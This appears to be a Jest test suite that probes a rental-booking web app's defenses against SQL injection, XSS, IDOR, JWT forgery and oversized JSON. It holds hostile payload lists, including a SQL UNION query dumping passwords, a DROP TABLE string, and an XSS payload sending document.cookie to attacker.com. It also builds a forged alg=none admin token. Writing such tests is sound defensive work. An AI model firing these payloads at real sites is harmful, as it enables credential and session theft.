/**
 * PILLAR 4 (ADVANCED): OWASP ZAP (ZED ATTACK PROXY) PENETRATION & FUZZING SUITE
 * Inspired by G:\Download Official\Web Testing\4.Security testing\zaproxy-main.zip
 * 
 * Deep dynamic penetration and fuzzing tests against OWASP Top 10:
 * - A01: Broken Access Control (BOLA / IDOR)
 * - A02: Cryptographic Failures & Token Tampering
 * - A03: SQL Injection (Union, Blind, Error) & Polyglot XSS Fuzzing
 * - A04: Insecure Design & Concurrency Race Condition Abuse
 * - A05: Security Misconfiguration & HTTP Security Headers
 * - A07: Identification and Authentication Failures
 */

const request = require('supertest');
const jwt = require('jsonwebtoken');
const app = require('../../src/app');
const { JWT_SECRET } = require('../../src/config/env');

describe('PILLAR 4: OWASP ZAP PENETRATION & VULNERABILITY TESTING', () => {
    let customerCookie;
    let customerToken;
    let customerUser;
    let otherUserBookingId;

    beforeAll(async () => {
        // Register genuine test user for authenticated flows
        const username = `zap_victim_${Date.now()}`;
        const regRes = await request(app)
            .post('/api/auth/register')
            .send({
                name: 'ZAP Test Customer',
                username,
                password: 'Password123!',
                role: 'customer'
            });

        customerCookie = regRes.headers['set-cookie'];
        customerUser = { userId: regRes.body.user.userId, name: 'ZAP Test Customer', role: 'customer' };
        customerToken = jwt.sign(customerUser, JWT_SECRET, { expiresIn: '1h' });

        // Seed a booking owned by another customer
        const otherCustToken = jwt.sign({ userId: 'other-victim-99', name: 'Other Guy', role: 'customer' }, JWT_SECRET);
        const bookRes = await request(app)
            .post('/api/bookings')
            .set('Cookie', [`token=${otherCustToken}`])
            .send({
                service: 'Hourly Rental',
                vehicle: 'Toyota Axio',
                pickupLocation: 'Gulshan 2',
                dropoffLocation: 'Uttara',
                dateTime: `2026-11-20 10:00:00-${Date.now()}`
            });
        if (bookRes.body && bookRes.body.data) {
            otherUserBookingId = bookRes.body.data.id;
        }
    });

    // =========================================================================
    // 4.1 ADVANCED SQL INJECTION (SQLi) FUZZING
    // =========================================================================
    describe('4.1 Advanced SQL Injection Fuzzing Matrix', () => {
        const sqliPayloads = [
            `' UNION SELECT id, username, password, email, '1', '2' FROM users --`,
            `1' ORDER BY 10--`,
            `admin'/*`,
            `'; DROP TABLE IF EXISTS test_dummy; --`,
            `' OR '1'='1`,
            `" OR ""="`,
            `1' AND (SELECT COUNT(*) FROM users) > 0 --`,
            `' UNION ALL SELECT null, null, null, null, null, null, null --`,
            `admin' OR 1=1#`,
            `'; WAITFOR DELAY '0:0:2'--`
        ];

        sqliPayloads.forEach((payload, index) => {
            test(`SQLi Vector #${index + 1}: should neutralize payload safely in search query: ${payload.slice(0, 25)}...`, async () => {
                const res = await request(app)
                    .get(`/api/inventory?search=${encodeURIComponent(payload)}`);

                expect(res.status).toBe(200);
                expect(Array.isArray(res.body.data)).toBe(true);
                // Ensure no raw SQL error or stack traces leaked
                expect(JSON.stringify(res.body)).not.toContain('SQLITE_ERROR');
                expect(JSON.stringify(res.body)).not.toContain('syntax error');
            });

            test(`SQLi Vector #${index + 1}: should reject payload in login credentials without syntax leak`, async () => {
                const res = await request(app)
                    .post('/api/auth/login')
                    .send({ username: payload, password: 'password123' });

                expect([400, 401]).toContain(res.status);
                expect(JSON.stringify(res.body)).not.toContain('syntax error');
                expect(JSON.stringify(res.body)).not.toContain('SQLITE_ERROR');
            });
        });
    });

    // =========================================================================
    // 4.2 CROSS-SITE SCRIPTING (XSS) & POLYGLOT PAYLOADS
    // =========================================================================
    describe('4.2 Stored & Reflected XSS Polyglot Neutralization', () => {
        const xssPayloads = [
            `<script>alert(document.cookie)</script>`,
            `"><img src=x onerror=alert(1)>`,
            `javascript:alert(1)`,
            `<svg/onload=fetch('http://attacker.com/steal?c='+document.cookie)>`,
            `'"><script src="//evil.com/xss.js"></script>`,
            `<iframe src="javascript:alert(1)"></iframe>`,
            `{{constructor.constructor('alert(1)')()}}`
        ];

        xssPayloads.forEach((xss, idx) => {
            test(`XSS Vector #${idx + 1}: should safely store and return payload without unsanitized execution`, async () => {
                const res = await request(app)
                    .put('/api/users/profile')
                    .set('Cookie', customerCookie)
                    .send({
                        name: `Hacker ${xss}`,
                        phone: '+880 1711 000000'
                    });

                expect([200, 400]).toContain(res.status);
                if (res.status === 200) {
                    expect(res.body.success).toBe(true);
                }
            });
        });
    });

    // =========================================================================
    // 4.3 BROKEN OBJECT-LEVEL AUTHORIZATION (BOLA / IDOR)
    // =========================================================================
    describe('4.3 Broken Object-Level Authorization (BOLA/IDOR) Defense', () => {
        test('Should block Customer A from modifying Customer B booking (IDOR)', async () => {
            if (!otherUserBookingId) return;

            const res = await request(app)
                .patch(`/api/bookings/${otherUserBookingId}/status`)
                .set('Cookie', customerCookie)
                .send({ status: 'Cancelled' });

            expect(res.status).toBe(403);
            expect(res.body.error).toContain('Forbidden');
        });

        test('Should block unauthenticated attacker from reading private user identity', async () => {
            const res = await request(app)
                .get('/api/auth/me');

            expect(res.status).toBe(401);
        });

        test('Should block regular customer from accessing admin/owner restricted inventory creation', async () => {
            const res = await request(app)
                .post('/api/inventory')
                .set('Cookie', customerCookie)
                .send({
                    name: 'Unauthorized Car Injection',
                    category: 'sedan_economy',
                    baseRate: 5000
                });

            expect(res.status).toBe(403);
        });
    });

    // =========================================================================
    // 4.4 CRYPTOGRAPHIC FAILURES & JWT TAMPERING EXPLOITS
    // =========================================================================
    describe('4.4 JWT Cryptographic Integrity & Alg=None Defense', () => {
        test('Should reject token with algorithm "none" forgery attempt', async () => {
            // Construct unsigned alg=none token
            const header = Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url');
            const payload = Buffer.from(JSON.stringify({ userId: 'admin-1', role: 'admin' })).toString('base64url');
            const forgedNoneToken = `${header}.${payload}.`;

            const res = await request(app)
                .get('/api/auth/me')
                .set('Cookie', [`token=${forgedNoneToken}`]);

            expect(res.status).toBe(401);
        });

        test('Should reject token signed with an invalid secret key', async () => {
            const fakeToken = jwt.sign({ userId: 'fake-admin', role: 'admin' }, 'WRONG_SECRET_KEY_123');

            const res = await request(app)
                .get('/api/auth/me')
                .set('Cookie', [`token=${fakeToken}`]);

            expect(res.status).toBe(401);
        });

        test('Should reject expired tokens with 401 Unauthorized', async () => {
            const expiredToken = jwt.sign({ userId: 'exp-user', role: 'customer' }, JWT_SECRET, { expiresIn: '-10s' });

            const res = await request(app)
                .get('/api/auth/me')
                .set('Cookie', [`token=${expiredToken}`]);

            expect(res.status).toBe(401);
        });
    });

    // =========================================================================
    // 4.5 DOS RESILIENCE & OVERSIZED PAYLOAD DEFENSE
    // =========================================================================
    describe('4.5 Denial of Service & Payload Boundary Defense', () => {
        test('Should reject excessively nested malformed JSON without process crash', async () => {
            const nested = '{"a":'.repeat(200) + '1' + '}'.repeat(200);

            const res = await request(app)
                .post('/api/auth/login')
                .set('Content-Type', 'application/json')
                .send(nested);

            expect([400, 401]).toContain(res.status);
        });

        test('Should verify Helmet HTTP security headers are enforced on all responses', async () => {
            const res = await request(app).get('/api/health');

            expect(res.headers).toHaveProperty('x-content-type-options', 'nosniff');
            expect(res.headers).toHaveProperty('x-xss-protection');
        });
    });
});
